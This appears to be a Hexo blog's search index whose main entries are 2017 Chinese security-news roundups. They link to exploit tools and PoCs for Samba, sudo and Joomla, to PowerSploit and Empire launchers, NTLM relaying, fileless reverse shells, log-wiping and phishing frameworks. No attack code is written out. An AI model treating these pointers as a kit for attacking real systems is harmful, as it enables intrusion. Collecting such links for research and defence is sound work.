    <content type="text"><![CDATA[每日安全动态 关于验证码识别的一篇文章 http://www.cnblogs.com/beer/p/5672678.html Mac OSX上检测rootkit http://macappstore.org/chkrootkit/ mac上安装rkhunter http://macappstore.org/rkhunter/ Mac上取证分析工具以及rootkit分析工具 http://yelp.github.io/osxcollector/ 黑客入侵应急分析手工排查 https://xianzhi.aliyun.com/forum/read/1655.html?from=timeline&amp;isappinstalled=0 1还是比较全面的，攻击者可以学习思路，避免留下把柄，防御者全面分析安全事件 检测windows存在的漏洞，需要先导出systeminfo信息 https://github.com/GDSSecurity/Windows-Exploit-Suggester/ samba CVE-2017-7497 EXP https://github.com/joxeankoret/CVE-2017-7494 一个在线分析pcap数据包的网站 http://www.capanalysis.net/ca/ 测试你通过msfvenom 生成shellcode的工具 https://github.com/emptymonkey/drinkme 使用 VirtualBox、INetSim 和 Burp 搭建自己的恶意软件分析平台 https://blog.christophetd.fr/set-up-your-own-malware-analysis-lab-with-virtualbox-inetsim-and-burp/ 据说很厉害的windows提权工具 https://github.com/PowerShellMafia/PowerSploit https://www.zero-day.io/metasploitwalkthrough/ 利用 dashboard 页面的一个 js 文件绕过认证 http://c0rni3sm.blogspot.com/2017/06/from-js-to-another-js-files-lead-to.html 三个案例看Nginx配置安全 https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html 一个故事告诉你比特币的原理及运作机制 http://blog.codinglabs.org/articles/bitcoin-mechanism-make-easy.html 渗透技巧——程序的降权启动 https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%99%8D%E6%9D%83%E5%90%AF%E5%8A%A8/ 二维码支付原理分析及安全性的探究 http://www.cnblogs.com/beer/p/6918180.html 1* Web应用系统的小安全漏洞及相应的攻击方式 &lt;http://www.cnblogs.com/beer/p/4814587.html&gt; 这也是一种攻击方式，不知道你们注意过没```]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170606安全动态]]></title>
    <url>%2F2017%2F06%2F06%2F20170606%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Printer Exploitation Toolkit 打印机漏洞利用工具 http://www.kitploit.com/2017/06/pret-printer-exploitation-toolkit.html?m=1 基于web的钓鱼框架 - Wiki to collect Red Team infrastructure hardening resources https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki#easy-web-based-phishing 1这个框架比较适合甲方安全部门内部搞红蓝对抗时使用 甲方的安全同学可以好好看看 The Journey to Hijacking a Country’s TLD – The Hidden Risks of Domain Extensions https://thehackerblog.com/the-journey-to-hijacking-a-countrys-tld-the-hidden-risks-of-domain-extensions/index.html Parallels Desktop 虚拟机逃逸，共享文件夹功能存在缺陷，虚拟机可向宿主机中写入任意文件 https://www.exploit-db.com/exploits/42116/ StarFighters- 基于 JavaScript 和 VBScript 的 Empire 攻击框架的进程 Launcher，无需启动 PowerShell.exe https://github.com/Cn33liz/StarFighters#a-javascript-and-vbscript-based-empire-launcher---by-cn33liz-2017 Lazydroid - 为评估 Android 应用程序提供方便的 Bash 脚本 https://github.com/nccgroup/LazyDroid windows-syscall-table - 从 WinXp sp0 到 Win10 rs2 1703 的 Windows 内核系统调用表收集 https://github.com/tinysec Joomla! Payage 2.05组件’aid’参数存在SQL注入 https://www.exploit-db.com/exploits/42113/ 通过xss能拿到shell的cms http://brutelogic.com.br/blog/compromising-cmses-xss/ WordSteal-一个从远程盗取NTMl的漏洞POC脚本 https://github.com/0x09al/wordsteal 使用JavaSnoop测试Java应用程序 http://bobao.360.cn/learning/detail/3939.html An interesting way of bypassing Windows Attachment Manager https://3gstudent.github.io/3gstudent.github.io/An-interesting-way-of-bypassing-Windows-Attachment-Manager/ 警惕“永恒之蓝”抓鸡工具包里的后门 http://www.freebuf.com/articles/system/136361.html GIT泄露漏洞综合利用的小工具 https://github.com/internetwache/GitTools]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170605]]></title>
    <url>%2F2017%2F06%2F05%2F20170605%2F</url>
    <content type="text"><![CDATA[安全动态 用来查找exp的工具getsploit - command line exploit search and download tool (supports Exploit-DB, MSF, Packet Storm, 0daytoday) https://github.com/vulnersCom/getsploit 如何实现渗透过程中的 Fileless 反弹 shell https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166 NTLM Relaying 实战 https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html https://www.youtube.com/watch?v=f9oMVoc2Umccc 通过Empire和Msfconsole利用永恒之蓝获得shell http://www.hackingtutorials.org/exploit-tutorials/exploiting-eternalblue-for-shell-with-empire-msfconsole/ 基于机器学习的分布式webshell检测系统 http://www.s0nnet.com/project 初见 Chrome Headless系列 https://lightless.me/archives/first-glance-at-chrome-headless-browser.html portspider - 轻量级的多线程极速网络扫描工具 http://www.kitploit.com/2017/06/portspider-lightning-fast-multithreaded.html 服务端注入之Flask框架中服务端模板注入问题 http://www.freebuf.com/articles/web/135953.html https://nvisium.com/blog/2015/12/07/injecting-flask/ 一款强大的WordPress漏洞利用框架 – WPXF http://www.freebuf.com/articles/web/135777.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[每周安全动态]]></title>
    <url>%2F2017%2F06%2F04%2F%E6%AF%8F%E5%91%A8%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每周安全动态 Google 引入定制的机器学习技术检测 Gmail 中的钓鱼邮件 https://threatpost.com/new-machine-learning-behind-early-phishing-detection-in-gmail/125976/ Ganxo - 开源 API Hook 框架 https://github.com/PassingTheKnowledge/Ganxo HTTPS 原理浅析及其在 Android 中的使用 http://mobile.51cto.com/android-540662.htm 初见 Chrome Headless Browser https://lightless.me/archives/first-glance-at-chrome-headless-browser.html EternalPot - 搭建全球性的SMB漏洞蜜罐基础设施的经验 https://doublepulsar.com/eternalpot-lessons-from-building-a-global-nation-state-smb-exploit-honeypot-infrastructure-3f2a0b064ffe 来自内部员工的威胁以及如何防御，来自 NCC Group 的 Paper https://www.nccgroup.trust/uk/our-research/understanding-the-insider-threat-and-how-to-mitigate-it/ Cheat Sheet of Machine Learning and Python (and Math) Cheat Sheets https://unsupervisedmethods.com/cheat-sheet-of-machine-learning-and-python-and-math-cheat-sheets-a4afe4e791b6 Package 钓鱼 http://blog.fatezero.org/2017/06/01/package-fishing/ Invoke-Phant0m Windows日志杀手 https://github.com/hlldz/Invoke-Phant0m 如何在PE文件中手动植入一个后门 http://bobao.360.cn/learning/detail/3931.html 渗透标准思维导图 https://www.processon.com/view/583e8834e4b08e31357bb727 从蜜罐数据到SSH蜜罐的典型攻击分析 http://bobao.360.cn/learning/detail/3929.html Joomla Core 3.x后台getshell https://howucan.gr/vulnerabilities/joomla-exploits/2215-joomla-core-3-x-poc-vulnerability-shell-upload sudo-CVE-2017-1000367漏洞利用程序 https://github.com/c0d3z3r0/sudo-CVE-2017-1000367 一键自动化域渗透工具 https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html 在OSX上监听单个应用HTTPS流量 https://calebfenton.github.io/2017/05/27/monitoring-https-of-a-single-app-on-osx/]]></content>
  </entry>
  <entry>
    <title><![CDATA[博客平台搭建]]></title>
    <url>%2F2017%2F04%2F28%2Fhexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[旧的博客 博客园可能以后不会再更新 旧博客地址：http://www.cnblogs.com/mrchang/新的博客搭建可参考http://gonghonglou.com/2016/02/03/firstblog/http://thief.one/2017/03/03/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/hexo的分享功能中大部分插件不支持https这很蛋疼，有时间再折腾。更新：已通过https://brightloong.github.io/2017/02/26/Hexo-Github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2-%E4%B8%89-%E2%80%94%E2%80%94%E7%99%BE%E5%BA%A6%E5%88%86%E4%BA%AB%E9%9B%86%E6%88%90/添加文章阅读量http://www.jeyzhang.com/hexo-next-add-post-views.html添加了分享和评论功能http://www.jianshu.com/p/276d10de413ehttp://theme-next.iissnan.com/third-party-services.htmlhexo 右边侧栏默认展示： 这里搭建此博客的目的主要记录一下日常工作和学习中看到的一些安全动态消息。 添加一个网页背景效果。12可以在public/tags/index.html 中添加如下的代码&lt;script type=&quot;text/javascript&quot; color=&quot;0,0,255&quot; opacity=&apos;0.7&apos; zIndex=&quot;-2&quot; count=&quot;99&quot; src=&quot;https://kevien.github.io/static/api/js/canvas-nest.min.js&quot;&gt;&lt;/script&gt; 搭建完成后常用命令发表一篇文章1$ hexo new "My New Post" mac上使用可以使用mweb工具进行md文件编辑1在/source/_posts 目录下面找到对应md文件编辑 发布hexo cleanhexo g generatehexo d deploy ok了markdown 语法 加粗使用双下滑线 空格使用 &amp;nbsp分号 删除线 双波浪线 添加超链接Google1[Google](http://www.google.com/)]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F04%2F28%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
